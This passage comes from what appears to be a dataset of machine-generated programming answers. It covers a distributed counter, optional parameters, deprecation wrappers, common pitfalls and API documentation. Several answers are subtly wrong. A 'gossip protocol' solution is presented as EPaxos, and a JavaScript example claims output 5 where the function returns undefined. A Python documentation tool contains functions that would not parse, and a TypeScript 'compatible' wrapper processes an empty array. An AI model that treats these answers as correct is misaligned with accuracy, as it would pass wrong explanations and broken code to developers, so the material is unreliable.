Node(K key, V value) {\n            this.key = key;\n            this.value = value;\n        }\n\n        @Override\n        public int compareTo(Node<K, V> other) {\n            return other.key.compareTo(this.key);\n        }\n    }\n}\n```\n\nQuestion 2: **Problem**: Implement a thread-safe, distributed counter service using a gossip protocol to propagate updates across nodes in a cluster. The counter should be able to handle increments and decrements from multiple nodes and maintain consistency.\n\n**Concept**: Distributed Systems, Thread Safety, Gossip Protocol\n\n**Solution**:\nTo implement a distributed counter service using a gossip protocol, we can use the EPaxos protocol, which is a variant of the Paxos algorithm. Here's a high-level outline in Python:\n\n```python\nimport threading\nimport random\nimport time\nimport numpy as np\n\nclass Node:\n    def __init__(self, node_id, peers):\n        self.node_id = node_id\n        self.peers = peers\n        self.values = {node_id: 0}\n        self.lock = threading.Lock()\n\n    def increment(self, node_id, value=1):\n        self._propagate_change(node_id, value, \"increment\")\n\n    def decrement(self, node_id, value=1):\n        self._propagate_change(node_id, value, \"decrement\")\n\n    def _propagate_change(self, node_id, value, operation):\n        for peer in self.peers:\n            if peer != node_id:\n                threading.Thread(target=self._send_change, args=(peer, node_id, value, operation)).start()\n\n    def _send_change(self, peer, node_id, value, operation):\n        while True:\n            time.sleep(np.random.exponential(scale=1))\n            if operation == \"increment\":\n                new_value = self.values.get(peer, 0) + value\n            elif operation == \"decrement\":\n                new_value = self.values.get(peer, 0) - value\n            else:\n                raise ValueError(\"Invalid operation\")\n\n            response = self._send_andAwaitResponse(peer, node_id, new_value)\n            if response and response[\"status\"] == \"success\":\n                with self.lock:\n                    self.values[peer] = new_value\n                    break\n\n    def _send_andAwaitResponse(self, peer, node_id, new_value):\n        # This is a placeholder for the actual network communication and protocol.\n        # Implement the EPaxos protocol here to send and receive the change proposal.\n        return {\"status\": \"success\"}\n\n# Usage\nnode1 = Node(1, [2, 3])\nnode2 = Node(2, [1, 3])\nnode3 = Node(3, [1, 2])\n\n# Increment from node1\nnode1.increment(node2.node_id, 5)\nnode1.increment(node3.node_id, 3)\n\n# Decrement from node2\nnode2.decrement(node1.node_id, 2)\nnode2.decrement(node3.node_id, 4)\n\n# Wait for propagation\ntime.sleep(5)\n\n# Print the counters\nprint(node1.values)\nprint(node2.values)\nprint(node3.values)\n```\n\nNote: This is a simplified, high-level example to demonstrate the idea. A complete implementation of EPaxos would involve more complex network communication, consensus protocols, and advanced concurrency control."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Usage with optional parameters", "Complexity_Level": "medium", "Response": "Problem 1:\nConcept: Function with Optional Parameters\n\nGiven a Python function `greet_user` that greets a user with a customizable message and an optional time of day. The default time of day is \"morning\". Write a code snippet using the function with different combinations of arguments, demonstrating the usage of optional parameters.\n\n```python\ndef greet_user(name, message=\"Hello\", time_of_day=\"morning\"):\n    print(f\"{time_of_day}, {name}! {message}\")\n\n# Usage 1: Using all parameters\ngreet_user(\"Alice\", \"Good to see you\", \"Afternoon\")\n\n# Usage 2: Using only mandatory parameter\ngreet_user(\"Bob\")\n\n# Usage 3: Using default parameter, but changing message\ngreet_user(\"Charlie\", \"Nice to meet you\")\n\n# Usage 4: Using default parameters, but changing time of day\ngreet_user(\"David\", time_of_day=\"Evening\")\n```\n\nProblem 2:\nConcept: Higher-order Function with Optional Parameters\n\nIn JavaScript, implement a higher-order function `calculate_total` that calculates the total price of items in a list, with an optional discount parameter. By default, there's no discount (0%). Write code demonstrating how to call this function with different discount scenarios.\n\n```javascript\nfunction calculate_total(items, discount = 0) {\n    let total = 0;\n    for (let item of items) {\n        total += item.price;\n    }\n    return total * (1 - discount / 100);\n}\n\n// Usage 1: Without discount\nconst items1 = [{ name: \"Item1\", price: 10 }, { name: \"Item2\", price: 20 }];\nconsole.log(calculate_total(items1)); // Output: 30\n\n// Usage 2: With 5% discount\nconst items2 = [{ name: \"Item3\", price: 15 }, { name: \"Item4\", price: 30 }];\nconsole.log(calculate_total(items2, 5)); // Output: 42.75\n\n// Usage 3: With 10% discount\nconst items3 = [{ name: \"Item5\", price: 50 }];\nconsole.log(calculate_total(items3, 10)); // Output: 45\n```"}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Usage with optional parameters", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nDesign a function in Python that calculates the factorial of a number using recursion, with optional parameters for memoization and logging. The function should utilize a dictionary for memoization and log each calculation to a file for debugging purposes.\n\nConcept: \"Optional Parameters\"\n\n```python\nimport functools\nimport logging\n\ndef configure_logger():\n    logging.basicConfig(filename='factorial_logger.txt', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')\n\ndef memoize(func):\n    memo = {}\n    @functools.wraps(func)\n    def wrapper(*args):\n        if args not in memo:\n            memo[args] = func(*args)\n        return memo[args]\n    return wrapper\n\n@memoize\ndef factorial(n, log=False):\n    if n == 0 or n == 1:\n        return 1\n    result = n * factorial(n - 1)\n    if log:\n        logging.debug(f\"Factorial of {n} calculated as {result}\")\n    return result\n\n# Usage: Basic calculation\nprint(factorial(10))\n\n# Usage: With memoization\nprint(factorial(1000))\n\n# Usage: With logging\nfactorial(7, log=True)\n```\n\nQuestion 2:\nCreate a JavaScript function for parsing a complex JSON object with optional parameters to control the parsing behavior. The function should handle nested objects and arrays, and allow the user to specify custom transformers and exclude certain keys during parsing.\n\nConcept: \"Optional Parameters\"\n\n```javascript\nfunction parseJSON(json, transformers = {}, excludeKeys = [], maxDepth = 50, currentDepth = 0) {\n    if (currentDepth > maxDepth) {\n        throw new Error('Maximum depth exceeded');\n    }\n\n    if (typeof json !== 'object' || json === null) {\n        return json;\n    }\n\n    if (Array.isArray(json)) {\n        return json.map(item => parseJSON(item, transformers, excludeKeys, maxDepth, currentDepth + 1));\n    }\n\n    const parsedObject = {};\n\n    for (const key in json) {\n        if (excludeKeys.includes(key)) continue;\n\n        const value = json[key];\n\n        if (typeof value === 'object' && value !== null) {\n            parsedObject[key] = parseJSON(value, transformers, excludeKeys, maxDepth, currentDepth + 1);\n        } else if (key in transformers) {\n            parsedObject[key] = transformers[key](value);\n        } else {\n            parsedObject[key] = value;\n        }\n    }\n\n    return parsedObject;\n}\n\n// JSON example\nconst complexJson = {\n    a: 1,\n    b: [2, {c: 3, d: [4, 5]}],\n    e: {f: 6, g: 7, h: {i: 8}}\n};\n\n// Transformers and exclusions\nconst transformers = {\n    g: value => value * 2\n};\nconst excludeKeys = ['h'];\n\n// Usage: Basic parsing\nconst parsedJson = parseJSON(complexJson);\nconsole.log(parsedJson);\n\n// Usage: With transformers\nconst parsedWithTransformers = parseJSON(complexJson, transformers);\nconsole.log(parsedWithTransformers);\n\n// Usage: With excluded keys\nconst parsedWithExcludedKeys = parseJSON(complexJson, {}, excludeKeys);\nconsole.log(parsedWithExcludedKeys);\n```"}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Deprecation alternatives", "Complexity_Level": "medium", "Response": "{\"Concept\": \"Function Deprecation\"}\n\nQuestion 1: In a Python application, a previously used function `old_function` is being replaced by a new, more efficient function `new_function`. Implement a deprecation alternative for `old_function` that raises a warning when called, redirecting users to use `new_function` instead.\n\nSolution:\n```python\nimport warnings\n\ndef old_function(*args, **kwargs):\n    warnings.warn(\"old_function is deprecated, please use new_function instead.\", DeprecationWarning)\n    return new_function(*args, **kwargs)\n\ndef new_function(x, y):\n    # New, more efficient implementation\n    return x + y\n\n# Example usage\nprint(old_function(3, 4))  # Output: DeprecationWarning: old_function is deprecated, please use new_function instead.\n                            #          7\n```\nQuestion 2: In a JavaScript library, a function `obsoleteMethod` is being replaced by `modernMethod` due to performance improvements. Create a deprecation alternative for `obsoleteMethod` that logs a deprecation message in the console.\n\nSolution:\n```javascript\nfunction obsoleteMethod(...args) {\n  console.warn(`obsoleteMethod is deprecated, please use modernMethod instead.`);\n  modernMethod(...args);\n}\n\nfunction modernMethod(a, b) {\n  // New, more efficient implementation\n  return a + b;\n}\n\n// Example usage\nconsole.log(obsoleteMethod(2, 3));  // Output: \"obsoleteMethod is deprecated, please use modernMethod instead.\"\n                                    //          5\n```\nIn both examples, when `old_function` or `obsoleteMethod` is called, a deprecation warning is raised or logged, guiding users to use the updated `new_function` or `modernMethod` instead."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Deprecation alternatives", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a complex migration strategy for a deprecated function in a large-scale distributed system using function composition and decorators.\n\n**Concept**: Function Composition, Decorators\n\n**Problem**: In a distributed system with millions of lines of code, a core function `old_compute(data)` is marked for deprecation. The system needs to be updated with a new function `new_compute(data, params)`, which has additional parameters and improved performance. Develop a strategy that transparently migrates calls to `old_compute` to `new_compute`, logs all deprecated calls, and maintains backwards compatibility for clients not yet updated.\n\n**Solution**:\n\n1. First, create a decorator to handle deprecation warnings and logging.\n2. Then, use function composition to wrap the new function with the decorator.\n\nHere's an example in Python:\n\n```python\nfrom functools import wraps\nimport logging\n\ndef deprecation_decorator(new_function):\n    @wraps(new_function)\n    def wrapper(data, *args, **kwargs):\n        logging.warning(f\"Function 'old_compute' is deprecated. Please use 'new_compute' instead.\")\n        return new_function(data, *args, **kwargs)\n    return wrapper\n\ndef new_compute(data, params):\n    # Your new computation logic here\n    pass\n\n# Deprecate old_compute and redirect to new_compute\nold_compute = deprecation_decorator(lambda data: new_compute(data, {}))\n\n# Example usage:\ndata = {\"key\": \"value\"}\nresult = old_compute(data)\n```\n\nIn this solution, the `deprecation_decorator` logs a warning and calls the new function `new_compute` with the appropriate parameters. The `old_compute` function is replaced by an instance of the decorator, which transparently handles the deprecation while maintaining the original function signature.\n\nQuestion 2: Implement a type-safe, backward-compatible alternative for a deprecated function in a TypeScript library, using higher-order functions and interfaces.\n\n**Concept**: Higher-order functions, Interfaces, Type Safety\n\n**Problem**: In a TypeScript library, a widely used function `oldProcess(data: any): any` is deprecated due to its weak type safety. The new function `newProcess<T>(data: T, transformer: (item: T) => T): T[]` requires a transformer function to ensure type safety. Design a solution to wrap `oldProcess` with `newProcess` while preserving compatibility for existing clients using `oldProcess`.\n\n**Solution**:\n\n1. Create an interface for the transformer function.\n2. Implement a higher-order function to handle the migration.\n\nHere's an example in TypeScript:\n\n```typescript\ninterface Transformer<T> {\n  (item: T): T;\n}\n\nfunction newProcess<T>(data: T[], transformer: Transformer<T>): T[] {\n  // Your new processing logic here\n  return data.map(transformer);\n}\n\n// Deprecate oldProcess and wrap it with newProcess\nfunction oldProcess(data: any): any[] {\n  throw new Error(\"This function is deprecated. Please use newProcess with a transformer.\");\n}\n\n// Higher-order function to create a backwards-compatible version\nfunction createDeprecatedWrapper<T>(transformer: Transformer<T>): () => T[] {\n  return () => newProcess<T>([], transformer);\n}\n\n// Example usage:\nconst data = [1, 2, 3] as number[];\nconst sumTransformer: Transformer<number> = (num) => num + 1;\n\n// Backwards compatibility for oldProcess\nconst deprecatedOldProcess = createDeprecatedWrapper<number>(sumTransformer);\nconst result = deprecatedOldProcess();\n```\n\nIn this solution, `oldProcess` is replaced with a function that throws an error, prompting users to migrate. The `createDeprecatedWrapper` function creates a wrapper for `newProcess` with the provided transformer, ensuring type safety. The `deprecatedOldProcess` function demonstrates a backward-compatible usage of the deprecated `oldProcess`."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Common pitfalls and workarounds", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Higher Order Functions\n\nProblem: Write a higher-order function `processList` in Python that takes a list of numbers and a function as arguments. It should apply the given function to each element of the list and return a new list with the transformed values. Common pitfall: Modifying the original list while processing.\n\nSolution:\n```python\ndef processList(numbers, func):\n    \"\"\"\n    Applies a given function to each element of a list and returns a new list with transformed values.\n\n    Args:\n        numbers (list): The input list of numbers.\n        func (function): A function to apply to each number.\n\n    Returns:\n        list: A new list containing the transformed numbers.\n    \"\"\"\n    result = []\n    for num in numbers:\n        # Avoid modifying the original list\n        transformed_num = func(num)\n        result.append(transformed_num)\n    return result\n\n# Example usage\ndef square(n):\n    return n ** 2\n\nnumbers = [1, 2, 3, 4, 5]\ntransformed_numbers = processList(numbers, square)\nprint(transformed_numbers)  # Output: [1, 4, 9, 16, 25]\n\n# Common pitfall: Modifying the original list\n# Avoid using 'append' directly on 'numbers' inside 'processList'\n# Incorrect implementation:\n# def incorrect_processList(numbers, func):\n#     for num in numbers:\n#         numbers.append(func(num))\n#     return numbers\n```\nQuestion 2:\nConcept: Polymorphism (Inheritance)\n\nProblem: Design a simple class hierarchy in Java for shapes with an abstract `Shape` class, a `Rectangle` class, and a `Circle` class. Implement a `getArea()` method for each class, and demonstrate polymorphism. Common pitfall: Not using `abstract` or `virtual` keywords appropriately.\n\nSolution:\n```java\npublic abstract class Shape {\n    public abstract double getArea();\n\n    // Common pitfall: Not making the method abstract if it's intended to be overridden\n    // Incorrect implementation:\n    // public double getArea() {\n    //     return 0.0;\n    // }\n}\n\npublic class Rectangle extends Shape {\n    private double width;\n    private double height;\n\n    public Rectangle(double width, double height) {\n        this.width = width;\n        this.height = height;\n    }\n\n    @Override\n    public double getArea() {\n        return width * height;\n    }\n}\n\npublic class Circle extends Shape {\n    private double radius;\n\n    public Circle(double radius) {\n        this.radius = radius;\n    }\n\n    @Override\n    public double getArea() {\n        return Math.PI * radius * radius;\n    }\n}\n\npublic class Main {\n    public static void main(String[] args) {\n        Shape rectangle = new Rectangle(5, 4);\n        Shape circle = new Circle(3);\n\n        System.out.println(\"Rectangle area: \" + rectangle.getArea());  // Output: Rectangle area: 20.0\n        System.out.println(\"Circle area: \" + circle.getArea());  // Output: Circle area: 28.274333882308138\n    }\n}\n```\nThese examples demonstrate common pitfalls when using higher-order functions and polymorphism. The solutions provide workarounds to ensure the original list is not modified in the first case and the correct abstract method is used in the second case."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Common pitfalls and workarounds", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nConsider a Python function `recursive_search` that retrieves deeply nested values from a complex nested dictionary using recursion. Discuss a common pitfall when dealing with recursive searches in such data structures and provide a workaround that ensures the function is efficient and doesn't lead to infinite recursion.\n\n**Concept**: Recursion\n\n**Solution**:\nA common pitfall in recursive searches is reaching a circular reference in the dictionary, causing infinite recursion. To avoid this, we can use a set to store visited keys and check if a key has been visited before continuing the recursion.\n\n```python\ndef recursive_search(dictionary, target, visited_keys=None):\n    if visited_keys is None:\n        visited_keys = set()\n\n    if id(dictionary) in visited_keys:\n        raise ValueError(\"Circular reference detected\")\n\n    visited_keys.add(id(dictionary))\n    for key, value in dictionary.items():\n        if key == target:\n            return value\n        elif isinstance(value, dict):\n            result = recursive_search(value, target, visited_keys)\n            if result is not None:\n                return result\n\n    return None\n\n# Example usage and pitfall\nnested_dict = {\n    'a': {\n        'b': {\n            'c': 1,\n            'd': {\n                'e': 2,\n                'f': {'g': 3, 'a': {'b': 4}}\n            }\n        }\n    }\n}\n\n# Normal search\nprint(recursive_search(nested_dict, 'c'))  # Output: 1\n\n# Circular reference\nnested_dict_with_cycle = {\n    'x': {'y': nested_dict},\n    'z': nested_dict\n}\nnested_dict_with_cycle['x']['y']['z'] = nested_dict_with_cycle\n\ntry:\n    print(recursive_search(nested_dict_with_cycle, 'x'))\nexcept ValueError as e:\n    print(str(e))  # Output: Circular reference detected\n```\n\nQuestion 2:\nIn a large TypeScript project, you have a higher-order function `compose` used to compose multiple functions. Identify a pitfall when dealing with function composition and provide a workaround that ensures proper type inference and avoids issues with the order of function execution.\n\n**Concept**: Higher-order functions\n\n**Solution**:\nA pitfall in TypeScript function composition is loss of type safety when composing functions with different input/output types. The workaround is to create a generic `compose` function that correctly infers types and enforces the correct order of function execution.\n\n```typescript\n// Utility type to get the return type of a function\ntype ReturnType<T> = T extends (...args: any[]) => infer R ? R : never;\n\n// Higher-order function for composition\nfunction compose<T extends (...args: any[]) => any, U extends (...args: any[]) => any>(\n  f: T,\n  g: (arg: ReturnType<T>) => ReturnType<U>\n): (...args: Parameters<T>) => ReturnType<U> {\n  return (...args: Parameters<T>) => g(f(...args));\n}\n\n// Example functions with different input/output types\nfunction uppercase(str: string): string {\n  return str.toUpperCase();\n}\n\nfunction reverseString(str: string): string {\n  return str.split('').reverse().join('');\n}\n\nfunction getLength(str: string): number {\n  return str.length;\n}\n\n// Composition without type safety\nconst uppercaseAndReverse = compose(reverseString, uppercase); // Error: Argument of type 'string' is not assignable to parameter of type 'number'\n\n// Composition with type safety\nconst reverseAndUppercase = compose(uppercase, reverseString); // Correct type inference and order\nconst result = reverseAndUppercase('hello world');\nconsole.log(result); // Output: 'DLROW OLLEH'\n```\nIn this example, the `compose` function uses generic types to enforce that the output of the first function matches the input of the second function, ensuring proper type inference and avoiding issues with the order of function execution."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Endpoint description", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: REST API Documentation\n\nProblem: You need to document an API endpoint that allows users to retrieve a list of all available products from an e-commerce platform. The endpoint should return a paginated list with a maximum of 20 items per page, supporting query parameters for sorting and filtering.\n\nSolution:\n```markdown\n## GET /api/v1/products\n\n### Description\nThis endpoint retrieves a paginated list of all available products in the e-commerce store. Users can specify sorting and filtering options using query parameters.\n\n### Parameters\n\n#### Query Parameters\n\n- `page`: (optional, integer, default: 1) The page number for pagination. The first page is 1.\n- `limit`: (optional, integer, default: 20) The maximum number of items to return per page. The allowed range is 1-100.\n- `sortBy`: (optional, string, default: 'name') The field to sort the products by. Valid options are 'name', 'price', 'rating', and 'dateAdded'.\n- `sortOrder`: (optional, string, default: 'asc') The sorting order. Valid options are 'asc' (ascending) and 'desc' (descending).\n- `category`: (optional, string) The product category to filter by. If not provided, all categories are included.\n\n### Response\n\n#### Status: 200 OK\n\n```json\n{\n  \"page\": 1,\n  \"limit\": 20,\n  \"totalPages\": 10,\n  \"products\": [\n    {\n      \"id\": 1,\n      \"name\": \"Product A\",\n      \"price\": 19.99,\n      \"category\": \"Electronics\",\n      \"rating\": 4.5,\n      \"dateAdded\": \"2021-01-01T00:00:00Z\"\n    },\n    ...\n  ]\n}\n```\n\nExample request:\n```\nGET /api/v1/products?sortBy=price&sortOrder=desc&page=2&limit=15&category=Electronics\n```\n\nQuestion 2:\nConcept: REST API Documentation\n\nProblem: You need to document an API endpoint that allows authenticated users to update their profile information, including their name, email, and password. The endpoint should accept a JSON payload with the updated information.\n\nSolution:\n```markdown\n## PUT /api/v1/users/:userId/profile\n\n### Description\nThis endpoint allows authenticated users to update their profile information. The user ID is obtained from the route parameter, and the updated information must be sent in the request body.\n\n### Authentication\nThis endpoint requires a valid JWT token in the `Authorization` header.\n\n### Parameters\n\n#### Path Parameters\n\n- `userId`: (required, integer) The unique identifier of the user's profile to update.\n\n#### Request Body\n\n```json\n{\n  \"name\": \"John Doe\",\n  \"email\": \"john@example.com\",\n  \"password\": \"newPassword123!\"\n}\n```\n\n- `name`: (optional, string) The updated full name of the user.\n- `email`: (optional, string, email) The updated email address of the user. Must be unique.\n- `password`: (optional, string) The updated password for the user. Must meet minimum complexity requirements.\n\n### Response\n\n#### Status: 200 OK\n\n```json\n{\n  \"message\": \"Profile updated successfully.\",\n  \"user\": {\n    \"id\": 123,\n    \"name\": \"John Doe\",\n    \"email\": \"john@example.com\"\n  }\n}\n```\n\n#### Status: 400 Bad Request\n\n```json\n{\n  \"error\": \"Invalid payload.\",\n  \"details\": \"Email must be unique.\"\n}\n```\n\n#### Status: 401 Unauthorized\n\n```json\n{\n  \"error\": \"Unauthorized\",\n  \"message\": \"Invalid or missing JWT token.\"\n}\n```\n\nExample request:\n```bash\nPUT /api/v1/users/123/profile\nAuthorization: Bearer valid_jwt_token\nContent-Type: application/json\n\n{\n  \"name\": \"John Doe\",\n  \"email\": \"newemail@example.com\",\n  \"password\": \"newPassword123!\"\n}\n```"}, {"L2_TASK": "Create API documentation", "L3_TASK": "Endpoint description", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop a comprehensive, interactive API documentation platform that not only describes endpoints but also simulates requests and responses, validates input data, and integrates with a live API for real-time testing. The platform should support multiple authentication methods, including OAuth2, JWT, and API keys.\n\nConcept: Web Development (API Documentation)\n\nSolution:\n```python\nimport os\nfrom flask import Flask, request, jsonify\nfrom flask_oauthlib.client import OAuth\nfrom flask_bcrypt import Bcrypt\nfrom flask_sqlalchemy import SQLAlchemy\nfrom flask_marshmallow import Marshmallow\nfrom flask_restx import Api, Resource, fields\n\napp = Flask(__name__)\napp.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or 'supersecretkey'\napp.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL') or 'sqlite:////tmp/test.db'\nbcrypt = Bcrypt(app)\ndb = SQLAlchemy(app)\nma = Marshmallow(app)\noauth = OAuth(app)\n\n# Initialize API\napi = Api(app, version='1.0', title='API Documentation', description='API endpoints for testing and documentation')\n\n# Models, schemas, and resources\n# ...\n# (Implement your models, database tables, and Marshmallow schemas according to your API)\n\n# Authentication\n@oauth.remote_app('oauth2', base_url='https://auth.example.com/', consumer_key='your_client_id', consumer_secret='your_client_secret',\n                  request_token_params={'scope': 'email'}, access_token_method='POST', access_token_url='https://auth.example.com/oauth2/token',\n                  authorize_url='https://auth.example.com/oauth2/authorize')\ndef authorize():\n    # Implement authorization logic\n    pass\n\n# API endpoint for displaying documentation and simulating requests\n@api.route('/api/docs/<string:endpoint>')\nclass DocResource(Resource):\n    @api.doc(description='Endpoint description, parameters, and example requests/responses')\n    def get(self, endpoint):\n        # Retrieve endpoint details from your API metadata\n        endpoint_details = get_endpoint_metadata(endpoint)\n        # Generate a form or UI elements for input data validation\n        form = generate_form(endpoint_details['parameters'])\n\n        if request.method == 'POST':\n            validated_data = validate_input(request.form.to_dict(), endpoint_details['schema'])\n            if validated_data:\n                # Simulate request to the live API and handle response\n                response = simulate_request(validated_data, endpoint)\n                # Validate response\n                validate_response(response, endpoint_details['expected_schema'])\n                return jsonify(response.json())\n            else:\n                return {'error': 'Invalid input data'}, 400\n\n        return {\n            'description': endpoint_details['description'],\n            'parameters': form,\n            'example_request': endpoint_details['example_request'],\n            'example_response': endpoint_details['example_response']\n        }\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nThis solution outlines the structure of a Flask application that creates an interactive API documentation platform. It includes OAuth2 authentication, endpoint description, input validation, and simulated requests. Note that you will need to implement the actual database models, schemas, and helper functions according to your API.\n\nQuestion 2: Create a CLI-based API documentation tool that generates Markdown documentation from OpenAPI specifications, including endpoint descriptions, parameters, and example requests/responses. The tool should also perform syntax validation for example data and provide suggestions for improving API design.\n\nConcept: Programming Language Concepts (Data, Control, Function)\n\nSolution:\n```python\nimport sys\nimport yaml\nfrom openapi_spec_validator import validate_spec_url\nfrom openapi_core import create_spec\nfrom openapi_core.validation.request.validators import RequestValidator\nfrom openapi_core.validation.response.validators import ResponseValidator\nfrom ruamel.yaml import YAML\n\ndef load_openapi_spec(openapi_url):\n    # Load and validate OpenAPI specification\n    response = validate_spec_url(openapi_url)\n    if response.errors:\n        raise ValueError(f'Invalid OpenAPI specification: {\", \".join(str(err) for err in response.errors)}')\n    return create_spec(openapi_url)\n\ndef generate_markdown(spec):\n    with open('api_documentation.md', 'w') as f:\n        for path, path_item in spec.paths.items():\n            f.write(f'\\n## {path}\\n')\n            for method, operation in path_item.items():\n                f.write(f'\\n### {method.upper()} {path}\\n')\n                f.write(f'{operation.summary}\\n\\n')\n\n                f.write('#### Parameters\\n')\n                for parameter in operation.parameters:\n                    f.write(f'- {parameter.name} ({parameter.in_}): {parameter.description}\\n')\n\n                f.write('#### Request Example\\n')\n                validate_request_example(operation.requestBody)\n\n                f.write('#### Response Example\\n')\n                validate_response_example(operation.responses)\n\ndef validate_request_example(request_body):\n    # Validate request body example against the schema\n    if request_body and request_body.content:\n        for media_type, schema in request_body.content.items():\n            example = schema.examples.get('example')\n            if example:\n                # Use a library to validate the example against the schema (e.g., jsonschema)\n                # ValidateExample(example, schema.schema)\n\ndef validate_response_example(responses):\n    # Validate response examples against the expected status codes and schemas\n    for status_code, response in responses.items():\n        example = response.examples.get('example')\n        if example:\n            # Use a library to validate the example against the schema (e.g., jsonschema)\n            # ValidateExample(example, response.schema)\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print('Usage: python api_documentation_tool.py <openapi_url>')\n        sys.exit(1)\n\n    openapi_url = sys.argv[1]\n    spec = load_openapi_spec(openapi_url)\n    generate_markdown(spec)\n```\nThis solution provides a command-line tool written in Python that reads an OpenAPI specification, validates it, and generates Markdown documentation. The tool also performs basic example data validation but leaves the actual validation implementation as a placeholder. You can use a library like `jsonschema` to complete the validation functionality."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Parameter details", "Complexity_Level": "medium", "Response": "Question 1: **Problem Statement:**\nCreate a medium-complexity problem where a developer needs to document a REST API endpoint with multiple parameters, including required and optional ones, and describe their data types, default values, and constraints.\n\n**Solution:**\nA developer is creating documentation for a REST API endpoint `/users` that allows creating a new user. The endpoint accepts the following parameters:\n\n1. `name` (required, string): The user's full name, must not be empty.\n2. `email` (required, string): The user's email, must be a valid email format.\n3. `age` (optional, integer): The user's age, default to 18 if not provided, and must be between 18 and 100.\n4. `is_active` (optional, boolean): Whether the user account is active, default to `true` if not provided.\n\nThe developer decides to use Markdown to create the documentation.\n\n**Example Code (Markdown):**\n```markdown\n## POST /users\n\n### Request Parameters\n\n| Parameter | Type     | Required | Default | Constraints |\n|-----------|----------|----------|---------|-------------|\n| name      | string   | Yes      | N/A     | Must not be empty |\n| email     | string   | Yes      | N/A     | Must be a valid email format |\n| age       | integer  | No       | 18      | Must be between 18 and 100 |\n| is_active | boolean  | No       | true    | N/A          |\n\n### Example Request\n\n```json\n{\n  \"name\": \"John Doe\",\n  \"email\": \"johndoe@example.com\",\n  \"age\": 25,\n  \"is_active\": true\n}\n```\n```\nQuestion 2: **Problem Statement:**\nDevelop a script to automatically generate API documentation for a Flask-based web application. The API has an endpoint `/books` that accepts parameters for searching books in a library.\n\n**Solution:**\nThe `books` endpoint supports the following parameters:\n\n1. `title` (optional, string): Search by book title.\n2. `author` (optional, string): Search by book author.\n3. `genre` (optional, string): Filter by book genre (e.g., 'fiction', 'non-fiction').\n4. `page_count` (optional, integer): Filter books with a certain number of pages, accepts a range in the format 'min-max'.\n\nUse Python and Flask's documentation capabilities to document the endpoint.\n\n**Example Code (Python):**\n```python\nfrom flask import Flask, request, jsonify\nfrom flask_smorest import Api, Blueprint, abort\n\napp = Flask(__name__)\napi = Api(app)\n\nbp = Blueprint('books', 'books', url_prefix='/api')\n\n@bp.route('/books')\ndef get_books():\n    title = request.args.get('title')\n    author = request.args.get('author')\n    genre = request.args.get('genre')\n    page_count = request.args.get('page_count')\n\n    # ... Perform search and return results ...\n\n    @bp.response(200, 'Success', {'data': [dict]})\n    def doc():\n        return {\n            \"description\": \"Get books based on search parameters.\",\n            \"parameters\": [\n                {\n                    \"name\": \"title\",\n                    \"in\": \"query\",\n                    \"type\": \"string\",\n                    \"description\": \"Search by book title.\"\n                },\n                {\n                    \"name\": \"author\",\n                    \"in\": \"query\",\n                    \"type\": \"string\",\n                    \"description\": \"Search by book author.\"\n                },\n                {\n                    \"name\": \"genre\",\n                    \"in\": \"query\",\n                    \"type\": \"string\",\n                    \"description\": \"Filter by book genre (e.g., 'fiction', 'non-fiction').\"\n                },\n                {\n                    \"name\": \"page_count\",\n                    \"in\": \"query\",\n                    \"type\": \"string\",\n                    \"description\": \"Filter books with a certain number of pages in the format 'min-max'.\"\n                }\n            ]\n        }\n\napi.register_blueprint(bp)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nIn this example, we use Flask-Smorest to document the API. The `doc` function defines the parameters and their details, which will be generated as part of the API documentation."}, {"L2_TASK": "Create API documentation", "L3_TASK": "Parameter details", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nConsider a complex RESTful API with multiple endpoints, each accepting various types of parameters, including nested objects and arrays. You need to generate dynamic, interactive documentation with detailed parameter information, automatic validation, and live example requests/responses. The documentation should also support authentication schemes like OAuth 2.0 and JWT tokens.\n\nConcept: \"Web Development\" (specifically \"API documentation\")\n\nSolution:\nYou can build a custom API documentation generator using Node.js and the Express framework. You'll leverage libraries such as Swagger-UI, Swagger-Parser, and JSON-Schema to handle the specification, validation, and visualization of your API.\n\nExample code:\n```javascript\nconst express = require('express');\nconst swaggerParser = require('@apidevtools/swagger-parser');\nconst swaggerUi = require('swagger-ui-express');\nconst yaml = require('js-yaml');\nconst fs = require('fs');\n\nconst app = express();\n\n// Load the OpenAPI specification (OpenAPI 3.0)\nconst apiSpec = yaml.safeLoad(fs.readFileSync('api-spec.yaml', 'utf8'));\n\n// Middleware to validate requests based on the OpenAPI spec\napp.use((req, res, next) => {\n  const { error } = swaggerParser.validate(apiSpec, req);\n  if (error) {\n    return res.status(400).json({ error: 'Invalid request parameters' });\n  }\n  next();\n});\n\n// Serve Swagger-UI for interactive documentation\napp.use('/api-docs', swaggerUi.serve, swaggerUi.setup(apiSpec, {\n  explorer: true,\n  oauth2RedirectUrl: 'http://localhost:3000/api-docs/oauth2/callback',\n  securityDefinitions: {\n    oauth2: {\n      type: 'oauth2',\n      flow: 'password',\n      tokenUrl: 'http://localhost:3000/auth/token',\n      scopes: {\n        'user:read': 'Read user data',\n        'user:write': 'Write user data'\n      }\n    }\n  }\n}));\n\n// Your API endpoints\napp.get('/api/users', (req, res) => {\n  // Implement API logic\n});\n\napp.post('/api/users', (req, res) => {\n  // Implement API logic\n});\n\n// Start the server\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\nIn `api-spec.yaml`, you would define your API endpoints, parameters, and authentication schemes in detail. This example demonstrates an OpenAPI 3.0 specification, which supports complex parameter structures, OAuth 2.0, and JWT tokens.\n\nQuestion 2:\nDevelop a script to automatically extract parameter details from Python 